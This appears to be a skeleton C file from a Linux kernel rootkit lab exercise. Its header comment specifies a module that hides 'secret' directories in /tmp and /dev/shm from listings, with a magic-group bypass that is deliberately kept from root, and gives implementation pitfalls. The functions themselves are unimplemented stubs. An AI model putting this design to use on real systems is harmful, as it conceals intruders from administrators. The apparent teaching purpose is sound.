/*
 * file_hide.c: hide secret directories from directory listings
 *
 * When a process lists /tmp or /dev/shm, remove the entry named "secret"
 * so it does not appear. Use d_path() to identify which directory is being
 * listed: do NOT use d_iname(), it returns the device name for mount
 * points, not the path you expect.
 *
 * Operator bypass: processes with MAGIC_GID see everything. Walk
 * cred->group_info directly: do NOT use in_group_p() (returns true for
 * root).
 *
 * Reference: cloak.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/cred.h>
#include <asm/ptrace.h>

#include "rootkit.h"

#define MAX_BUF_SIZE (1 << 16)


static bool active;

int file_hide_init(void)
{
	/* TODO */
	return -ENOSYS;
}

void file_hide_exit(void)
{
	/* TODO */
}

int file_hide_enable(void)
{
	/* TODO */
	return -ENOSYS;
}

void file_hide_disable(void)
{
}

bool file_hide_is_active(void)
{
	return active;
}
